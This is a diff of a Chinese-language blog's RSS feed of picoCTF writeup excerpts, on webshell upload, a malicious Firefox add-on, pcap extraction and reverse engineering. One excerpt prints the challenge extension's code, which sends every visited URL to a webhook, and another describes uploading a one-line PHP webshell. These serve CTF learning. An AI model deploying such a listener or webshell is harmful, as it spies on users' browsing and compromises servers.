@@ -12,12 +12,177 @@
     
     <copyright>本部落格所有文章除特別聲明外，均採用 BY-NC-SA 授權協議。轉載請註明出處！</copyright>
     
-    <lastBuildDate>Thu, 07 May 2026 08:00:52 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 17 Sep 2026 11:30:52 +0800</lastBuildDate>
     
     
     <atom:link href="http://localhost:1313/tags/picoctf/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>n0s4n1ty 1</title>
+      <link>http://localhost:1313/post/n0s4n1ty_1/</link>
+      <pubDate>Thu, 17 Sep 2026 10:30:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/n0s4n1ty_1/</guid>
+      <description>
+        <![CDATA[<h1>n0s4n1ty 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><h3 id="開啟並觀察題目網頁">
+<a class="header-anchor" href="#%e9%96%8b%e5%95%9f%e4%b8%a6%e8%a7%80%e5%af%9f%e9%a1%8c%e7%9b%ae%e7%b6%b2%e9%a0%81"></a>
+開啟並觀察題目網頁
+</h3><p>發現題目後端系統是由php寫的,並且有一個上傳的功能
+<img src="/images/n0s4n1ty_1/1.webp" alt="image"></p>
+<h3 id="嘗試編寫一句話木馬並上傳">
+<a class="header-anchor" href="#%e5%98%97%e8%a9%a6%e7%b7%a8%e5%af%ab%e4%b8%80%e5%8f%a5%e8%a9%b1%e6%9c%a8%e9%a6%ac%e4%b8%a6%e4%b8%8a%e5%82%b3"></a>
+嘗試編寫一句話木馬並上傳
+</h3><p>創建一個cmd.php的文件,寫入一句話木馬</p>
+        
+        <hr><p>本文2026-09-17首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-09-17</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>The Add/On Trap writeup</title>
+      <link>http://localhost:1313/post/the_add_on_trap/</link>
+      <pubDate>Tue, 25 Aug 2026 14:54:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/the_add_on_trap/</guid>
+      <description>
+        <![CDATA[<h1>The Add/On Trap writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="解壓縮題目給的xpi檔">
+<a class="header-anchor" href="#%e8%a7%a3%e5%a3%93%e7%b8%ae%e9%a1%8c%e7%9b%ae%e7%b5%a6%e7%9a%84xpi%e6%aa%94"></a>
+解壓縮題目給的.xpi檔
+</h2><p><img src="/images/The_Add_On_Trap/1.webp" alt="image"></p>
+<h2 id="解題">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
+解題
+</h2><p>查看每一個檔案,在background/main.js中發現可疑的程式碼</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Secret</span> <span class="n">key</span> <span class="n">must</span> <span class="n">be</span> <span class="mi">32</span> <span class="n">url</span><span class="o">-</span><span class="n">safe</span> <span class="n">base64</span><span class="o">-</span><span class="n">encoded</span> <span class="n">bytes</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">TODO</span> <span class="n">I</span> <span class="n">must</span> <span class="n">find</span> <span class="n">a</span> <span class="n">solution</span> <span class="n">to</span> <span class="n">remove</span> <span class="n">the</span> <span class="n">key</span> <span class="n">from</span> <span class="n">here</span><span class="p">,</span> <span class="k">for</span> <span class="n">now</span> <span class="n">I</span><span class="s1">&#39;ll leave it there because I need it to encrypt the webhook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">function</span> <span class="n">logOnCompleted</span><span class="p">(</span><span class="n">details</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="err">`</span><span class="n">Information</span> <span class="n">to</span> <span class="n">exfiltrate</span><span class="p">:</span> <span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">key</span><span class="o">=</span><span class="s2">&#34;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">webhookUrl</span><span class="o">=</span><span class="s1">&#39;gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">content</span><span class="p">:</span> <span class="err">`</span><span class="o">$</span><span class="p">{</span><span class="n">details</span><span class="o">.</span><span class="n">url</span><span class="p">}</span><span class="err">`</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fetch</span><span class="p">(</span><span class="n">webhookUrl</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">method</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span><span class="p">:</span> <span class="n">JSON</span><span class="o">.</span><span class="n">stringify</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">response</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">204</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">throw</span> <span class="err">`</span><span class="n">Unable</span> <span class="n">to</span> <span class="n">complete</span> <span class="n">the</span> <span class="n">extraction</span><span class="o">!</span><span class="err">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">browser</span><span class="o">.</span><span class="n">webNavigation</span><span class="o">.</span><span class="n">onCompleted</span><span class="o">.</span><span class="n">addListener</span><span class="p">(</span><span class="n">logOnCompleted</span><span class="p">);</span>
+</span></span></code></pre></div><p>其中<code>const key=&quot;cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0=&quot;</code>明顯是base64加密,我們把它進行解密
+<img src="/images/The_Add_On_Trap/2.webp" alt="image">
+取得了一個假的flag</p>
+        
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Silent Stream writeup</title>
+      <link>http://localhost:1313/post/silent_stream/</link>
+      <pubDate>Tue, 18 Aug 2026 22:31:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/silent_stream/</guid>
+      <description>
+        <![CDATA[<h1>Silent Stream writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="將題目的pcap檔的data提取出來">
+<a class="header-anchor" href="#%e5%b0%87%e9%a1%8c%e7%9b%ae%e7%9a%84pcap%e6%aa%94%e7%9a%84data%e6%8f%90%e5%8f%96%e5%87%ba%e4%be%86"></a>
+將題目的pcap檔的data提取出來
+</h2><h3 id="使用wireshark">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8wireshark"></a>
+使用wireshark
+</h3><p><img src="/images/Silent_Stream/1.webp" alt="image"></p>
+<h3 id="提取資料">
+<a class="header-anchor" href="#%e6%8f%90%e5%8f%96%e8%b3%87%e6%96%99"></a>
+提取資料
+</h3><p>發現他都是10.10.10.10-&gt;10.10.10.11的tcp封包,且好像是同一個session,<br>
+因此我們隨便點一個封包,右鍵-&gt;Follow-&gt;TCP Stream
+<img src="/images/Silent_Stream/2.webp" alt="image">
+Show as 選擇Raw,按save as
+<img src="/images/Silent_Stream/3.webp" alt="image">
+儲存成stream.bin
+<img src="/images/Silent_Stream/4.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Gatekeeper writeup</title>
+      <link>http://localhost:1313/post/gatekeeper/</link>
+      <pubDate>Tue, 11 Aug 2026 16:39:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/gatekeeper/</guid>
+      <description>
+        <![CDATA[<h1>Gatekeeper writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="用ida-逆向題目">
+<a class="header-anchor" href="#%e7%94%a8ida-%e9%80%86%e5%90%91%e9%a1%8c%e7%9b%ae"></a>
+用IDA 逆向題目
+</h2><p>逆向main函數
+<img src="/images/gatekeeper/1.webp" alt="image">
+逆向reveal_flag函數
+<img src="/images/gatekeeper/2.webp" alt="image"></p>
+<h2 id="解題方法">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%96%b9%e6%b3%95"></a>
+解題方法
+</h2><p>根據逆向結果,進入reveal_flag條件為：</p>
+<ol>
+<li>大於999</li>
+<li>小於9999</li>
+<li>位數等於3
+因此用普通的十進位無法進入，我們可以用十六進位(FFF)來進入該函數
+接著會取得被翻轉並加料的flag,我們利用python腳本還原</li>
+</ol>
+<h2 id="取得被翻轉並加料的flag">
+<a class="header-anchor" href="#%e5%8f%96%e5%be%97%e8%a2%ab%e7%bf%bb%e8%bd%89%e4%b8%a6%e5%8a%a0%e6%96%99%e7%9a%84flag"></a>
+取得被翻轉並加料的flag
+</h2><p>輸入FFF
+<img src="/images/gatekeeper/3.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-11首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-11</p>]]>
+      </description>
+      
+        <category>picoctf</category>
+      
+    </item>
     
     
 
@@ -205,119 +370,6 @@ What is XXE Injection?
 XXE 攻擊就是利用這個功能，讓伺服器去讀取它不該暴露的東西。此攻擊能用於：</p>
         
         <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>No Sql Injection writeup</title>
-      <link>http://localhost:1313/post/no_sql_injection/</link>
-      <pubDate>Tue, 05 May 2026 13:00:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/no_sql_injection/</guid>
-      <description>
-        <![CDATA[<h1>No Sql Injection writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="解題">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
-解題
-</h2><p><strong>下載題目程式碼</strong>
-<img src="/images/No_Sql_Injection/1.webp" alt="image"></p>
-<h3 id="觀察題目程式碼">
-<a class="header-anchor" href="#%e8%a7%80%e5%af%9f%e9%a1%8c%e7%9b%ae%e7%a8%8b%e5%bc%8f%e7%a2%bc"></a>
-觀察題目程式碼
-</h3><p><strong>發現有一個/admin的頁面</strong>
-<img src="/images/No_Sql_Injection/2.webp" alt="image">
-<strong>在server.js中發現伺服器資料庫使用mongo DB</strong>
-<img src="/images/No_Sql_Injection/3.webp" alt="image">
-<strong>在server.js中發現使用者帳號</strong>
-<img src="/images/No_Sql_Injection/4.webp" alt="image">
-<strong>在server.js中發現疑似把flag儲存在tocken中</strong>
-<img src="/images/No_Sql_Injection/5.webp" alt="image">
-<strong>在server.js中發現他將前端送出的帳號密碼直接串接成查詢語句,造成NoSql Injection</strong>
-<img src="/images/No_Sql_Injection/6.webp" alt="image"></p>
-        
-        <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>Trickster writeup</title>
-      <link>http://localhost:1313/post/trickster/</link>
-      <pubDate>Tue, 05 May 2026 12:00:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/trickster/</guid>
-      <description>
-        <![CDATA[<h1>Trickster writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="whis-is-magic-number">
-<a class="header-anchor" href="#whis-is-magic-number"></a>
-Whis is magic number?
-</h2><p>Magic number 是放在檔案最開頭的一組固定位元組序列，作用就像檔案的「身分證」，讓作業系統或程式能快速辨識這個檔案到底是什麼類型，而不需要依賴副檔名。各種檔案格式的 magic number 如下：</p>
-        
-        <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>Pachinko writeup</title>
-      <link>http://localhost:1313/post/pachinko/</link>
-      <pubDate>Mon, 04 May 2026 11:54:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/pachinko/</guid>
-      <description>
-        <![CDATA[<h1>Pachinko writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="what-is-race-condition">
-<a class="header-anchor" href="#what-is-race-condition"></a>
-What is race condition?
-</h2><p>Race Condition 是一種「時間差漏洞」。當系統在處理多個同時發生的請求時，因為步驟之間沒有做好鎖定（locking），就會產生邏輯錯誤。<br>
-例如轉帳：假設你的錢包有 100 元，轉帳流程分三步：① 檢查餘額 → ② 送出錢 → ③ 扣除餘額。<br>
-正常情況下，轉一次 100 元後餘額歸零，沒問題。但如果你同時發出兩個轉帳請求，事情就變了：<br>
-請求 A 檢查餘額：100（通過）<br>
-請求 B 檢查餘額：100（也通過，因為 A 還沒扣錢）
-請求 A 送出 100 元<br>
-請求 B 也送出 100 元<br>
-扣款才開始執行……</p>
-        
-        <hr><p>本文2026-05-04首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-04</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>3v@l writeup</title>
-      <link>http://localhost:1313/post/3v@l/</link>
-      <pubDate>Mon, 04 May 2026 09:53:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/3v@l/</guid>
-      <description>
-        <![CDATA[<h1>3v@l writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="what-is-eval-">
-<a class="header-anchor" href="#what-is-eval-"></a>
-What is eval ?
-</h2><p>eval() 是 Python 的內建函式，它能將字串當作程式碼來執行，並回傳結果。它通常被用在需要動態計算表達式的場景，例如計算機應用程式、設定檔解析、或資料處理中動態執行公式。</p>
-        
-        <hr><p>本文2026-05-04首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-04</p>]]>
       </description>
       
         <category>picoctf</category>
